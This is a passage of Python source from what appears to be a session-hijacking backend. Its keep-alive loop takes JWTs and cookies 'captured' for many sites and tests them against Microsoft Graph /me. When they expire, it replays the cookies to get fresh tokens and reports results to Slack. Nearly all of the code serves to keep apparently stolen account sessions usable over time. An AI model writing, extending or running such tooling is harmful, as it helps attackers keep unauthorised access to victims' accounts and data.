    cookies = data.get("cookies") or []
    snap["cookies"] = len(cookies)
    captured_at = data.get("captured_at") or 0
    if captured_at:
        snap["captured_age"] = int(time.time() - captured_at)
    buf = _site_history.setdefault(
        site_id, _deque(maxlen=_SITE_HISTORY_MAX))
    buf.append(snap)


def _trace_enabled() -> bool:
    """True when the operator opted into per-cycle verbose tracing
    via Settings → Configuration → keepalive_trace_enabled. Off by
    default — adds 3-5 log lines per site per cycle when on."""
    return bool(get_config_value("keepalive_trace_enabled", False))


def _trace(hostname: str, msg: str) -> None:
    """Emit a single keep-alive trace line on the `keepalive` log
    category. No-op when keepalive_trace_enabled is off."""
    if not _trace_enabled():
        return
    append_log("info", "keepalive", f"[{hostname}] TRACE {msg}")


def get_site_history(site_id: str) -> list[dict]:
    """Return up to the last _SITE_HISTORY_MAX snapshots for a site,
    oldest-first. Empty when keep-alive hasn't run for this site yet."""
    buf = _site_history.get(site_id)
    return list(buf) if buf else []


def get_lifetime_summary(site_id: str) -> dict | None:
    """Aggregate the rolling history into a lifetime overview:

    - `current_expires_in` — seconds until the most-recently-observed
      token's `exp` claim. Negative when already expired.
    - `current_expired` — bool.
    - `typical_lifetime_secs` — maximum `expires_in` ever observed in
      the buffer. Approximates the token's full original lifetime
      (caught right after issuance) when at least one refresh has
      been recorded.
    - `refresh_count` — number of fresh-token transitions detected.
      Counted as either a `valid: false → true` flip OR an `exp`
      claim that jumped forward by more than 60 seconds vs the
      previous snapshot.
    - `last_refresh_ts` — epoch of the most recent refresh transition.
    - `avg_refresh_interval_secs` — mean time between refresh events
      when at least two have been observed.
    - `next_refresh_eta_secs` — current_expires_in (the cycle drives
      the refresh as soon as exp goes negative, so this is the floor
      on time-to-next-refresh).
    - `snapshot_count` — buffer size.

    Returns None when no history is buffered yet."""
    hist = list(_site_history.get(site_id) or [])
    if not hist:
        return None
    last = hist[-1]

    exp_in_values = [h.get("expires_in") for h in hist
                      if isinstance(h.get("expires_in"), (int, float))]
    typical = max(exp_in_values) if exp_in_values else None

    refresh_ts: list[float] = []
    prev = None
    for h in hist:
        if prev is not None:
            p_exp = prev.get("exp")
            c_exp = h.get("exp")
            jumped = (isinstance(p_exp, (int, float))
                       and isinstance(c_exp, (int, float))
                       and c_exp > p_exp + 60)
            recovered = (prev.get("valid") is False
                          and h.get("valid") is True)
            if jumped or recovered:
                ts = h.get("ts")
                if isinstance(ts, (int, float)):
                    refresh_ts.append(ts)
        prev = h

    avg_interval = None
    if len(refresh_ts) >= 2:
        diffs = [refresh_ts[i + 1] - refresh_ts[i]
                 for i in range(len(refresh_ts) - 1)]
        if diffs:
            avg_interval = sum(diffs) / len(diffs)

    cur_exp_in = last.get("expires_in")
    return {
        "current_expires_in": cur_exp_in,
        "current_expired": bool(last.get("expired")),
        "current_valid": last.get("valid"),
        "typical_lifetime_secs": typical,
        "refresh_count": len(refresh_ts),
        "last_refresh_ts": refresh_ts[-1] if refresh_ts else None,
        "avg_refresh_interval_secs": avg_interval,
        "next_refresh_eta_secs": (cur_exp_in if isinstance(
            cur_exp_in, (int, float)) else None),
        "snapshot_count": len(hist),
        "first_snapshot_ts": hist[0].get("ts") if hist else None,
        "aud": last.get("aud"),
        "tid": last.get("tid"),
    }


def get_all_lifetime_summaries() -> dict[str, dict]:
    """Map of site_id → lifetime summary across every site that has
    a non-empty history buffer. Used by the Keep-Alive panel's
    Token Lifetime Overview card."""
    out: dict[str, dict] = {}
    for site_id in _site_history.keys():
        summary = get_lifetime_summary(site_id)
        if summary:
            out[site_id] = summary
    return out


async def _keepalive_loop():
    """Main keep-alive loop. Checks all captured sites on each interval."""
    global _last_run, _last_results

    # Short initial delay to let the server finish starting
    await asyncio.sleep(5)

    while True:
        if not get_config_value("keepalive_enabled", False):
            await asyncio.sleep(30)
            continue

        append_log("info", "keepalive", "Keep-alive check starting...")
        site_keys = credentials_store.list_keys()
        results = {}

        for site_id in site_keys:
            data = credentials_store.get(site_id)
            if not data:
                continue
            # Sites with too many consecutive failures get paused so
            # we stop hammering Graph + the cookie-replay endpoint
            # and stop spamming Slack with the same alert every
            # cycle. Operator resumes via the Debug-panel Resume
            # button.
            if is_site_paused(site_id):
                continue

            # Derive hostname for display
            current_url = data.get("current_url", "")
            try:
                hostname = urlparse(current_url).hostname or site_id.replace("_", ".")
            except Exception:
                hostname = site_id.replace("_", ".")

            token, source = _find_best_token(data)
            if not token:
                results[site_id] = {"valid": None, "hostname": hostname,
                                     "reason": "no_token", "checked_at": time.time()}
                try:
                    _snapshot_site(site_id, data, None, "",
                                    valid=None, http_status=None)
                except Exception:
                    pass
                continue

            # Per-site claim summary on the trace category — fires
            # once per cycle when keepalive_trace_enabled is on.
            if _trace_enabled():
                tdec = _decode_jwt_payload(token) or {}
                exp = tdec.get("exp")
                exp_in = (int(exp - time.time())
                           if isinstance(exp, (int, float)) else None)
                cookies_n = len(data.get("cookies") or [])
                cap_age = (int(time.time() - (data.get("captured_at") or 0))
                            if data.get("captured_at") else None)
                _trace(hostname,
                        f"check source={source} aud={tdec.get('aud','')} "
                        f"tid={tdec.get('tid','')} "
                        f"scp={(tdec.get('scp') or tdec.get('scope') or '')[:80]} "
                        f"exp_in={exp_in}s cookies={cookies_n} "
                        f"captured_age={cap_age}s")

            result = await _test_token(token, hostname=hostname,
                                          site_id=site_id)
            result["hostname"] = hostname
            result["token_source"] = source
            result["checked_at"] = time.time()

            # Per-cycle snapshot — runs every cycle so the Debug
            # button can show a lifetime trend even when nobody was
            # watching at the moment of expiry. Cheap (no network).
            try:
                _snapshot_site(site_id, data, token, source,
                                valid=bool(result.get("valid")),
                                http_status=result.get("status_code"))
            except Exception:
                pass

            if result["valid"]:
                _record_success(site_id)
                graph_user = result.get("user", "")
                detail = f"User: {graph_user}" if graph_user else ""
                method = result.get("method", "local")
                status_desc = (f"HTTP {result['status_code']}" if "status_code" in result
                               else f"local JWT exp in {result.get('expires_in', '?')}s")
                append_log("info", "keepalive",
                           f"[{hostname}] Token VALID ({status_desc}) {detail}")
                _ka_log({"event": "check", "site": hostname,
                          "site_id": site_id, "status": "valid",
                         "http": result.get("status_code"),
                         "method": method,
                         "expires_in": result.get("expires_in"),
                         "user": graph_user,
                         "source": source})
                await notify_slack_keepalive(site_id, hostname, True, detail,
                                             user=graph_user)
            else:
                http_code = result.get("status_code", "?")
                error_detail = result.get("error", "")

                # Attempt re-auth before deciding loudness — a
                # successful refresh resets the counter and we stay
                # quiet. Failure increments the counter; we only
                # talk to Slack on the transition-to-paused cycle.
                refreshed = await _attempt_cookie_reauth(site_id, data)
                result["reauth_attempted"] = True
                result["reauth_success"] = refreshed
                _ka_log({"event": "reauth", "site": hostname,
                          "site_id": site_id,
                          "status": "success" if refreshed else "failed"})

                if refreshed:
                    _record_success(site_id)
                    append_log("info", "keepalive",
                               f"[{hostname}] Token EXPIRED (HTTP "
                               f"{http_code}) → re-auth SUCCEEDED")
                    _ka_log({"event": "check", "site": hostname,
                              "site_id": site_id, "status": "expired",
                              "http": http_code, "source": source,
                              "reauth": "success"})
                    await notify_slack_keepalive(
                        site_id, hostname, True,
                        "Cookie re-auth succeeded - token refreshed")
                else:
                    consec, just_paused = _record_failure(
                        site_id, hostname,
                        f"HTTP {http_code} + reauth failed")
                    _ka_log({"event": "check", "site": hostname,
                              "site_id": site_id, "status": "expired",
                              "http": http_code, "source": source,
                              "reauth": "failed",
                              "consecutive_failures": consec,
                              "paused": just_paused})
                    if just_paused:
                        # Transition cycle — loud once, then quiet.
                        append_log("warn", "keepalive",
                                   f"[{hostname}] Token EXPIRED "
                                   f"(HTTP {http_code}) — re-auth "
                                   f"failed {consec} time(s), site "
                                   f"PAUSED.")
                        graph_detail = (
                            f"Graph /me returned HTTP {http_code}; "
                            f"cookie re-auth failed {consec} time(s) "
                            f"— site paused.")
                        if error_detail:
                            graph_detail += f" {error_detail}"
                        await notify_slack_keepalive(
                            site_id, hostname, False, graph_detail)
                        await _notify_slack_failure(
                            hostname,
                            f"Re-auth failed {consec}× — paused")
                        await mark_jwt_expired(site_id)
                    else:
                        # Pre-pause failure — short, log only, no
                        # Slack noise.
                        append_log("info", "keepalive",
                                   f"[{hostname}] Token EXPIRED "
                                   f"(HTTP {http_code}) re-auth "
                                   f"failed {consec}/"
                                   f"{_failure_threshold()}")

            results[site_id] = result

        _last_run = time.time()
        _last_results = results

        checked = len(results)
        valid = sum(1 for r in results.values() if r.get("valid") is True)
        expired = sum(1 for r in results.values() if r.get("valid") is False)
        skipped = sum(1 for r in results.values() if r.get("valid") is None)
        append_log("info", "keepalive",
                   f"Keep-alive done: {checked} sites - {valid} valid, {expired} expired, {skipped} skipped")
        _ka_log({"event": "cycle_complete", "checked": checked,
                 "valid": valid, "expired": expired, "skipped": skipped})

        # Sleep until next cycle
        interval = get_config_value("keepalive_interval_minutes", 5) * 60
        await asyncio.sleep(interval)


# ── Public API ────────────────────────────────────────────

async def start_keepalive() -> dict:
    global _keepalive_task
    if _keepalive_task is not None and not _keepalive_task.done():
        return {"running": True, "message": "Already running"}
    _keepalive_task = asyncio.create_task(_keepalive_loop())
    append_log("info", "keepalive", "Keep-alive monitor started")
    return {"running": True}


async def stop_keepalive() -> dict:
    global _keepalive_task
    if _keepalive_task is None or _keepalive_task.done():
        return {"running": False, "message": "Not running"}
    _keepalive_task.cancel()
    try:
        await _keepalive_task
    except asyncio.CancelledError:
        pass
    _keepalive_task = None
    append_log("info", "keepalive", "Keep-alive monitor stopped")
    return {"running": False}


def get_keepalive_status() -> dict:
    running = _keepalive_task is not None and not _keepalive_task.done()
    pw_stats: dict = {"running": False}
    try:
        from backend import keepalive_pw as _kpw
        pw_stats = _kpw.stats()
    except Exception:
        pass
    # Hostname lookup so the UI can label by hostname instead of
    # raw site_id. Pull from credentials_store entries the keepalive
    # has already touched.
    hostnames: dict[str, str] = {}
    for site_id in _site_history.keys():
        try:
            data = credentials_store.get(site_id) or {}
            cu = data.get("current_url") or ""
            host = urlparse(cu).hostname if cu else None
            hostnames[site_id] = host or site_id.replace("_", ".")
        except Exception:
            hostnames[site_id] = site_id.replace("_", ".")
    return {
        "running": running,
        "last_run": _last_run,
        "last_results": _last_results,
        "interval_minutes": get_config_value("keepalive_interval_minutes", 5),
        "pw_fallback_enabled": bool(get_config_value(
            "keepalive_playwright_fallback_enabled", False)),
        "pw_browser": pw_stats,
        "lifetimes": get_all_lifetime_summaries(),
        "hostnames": hostnames,
    }
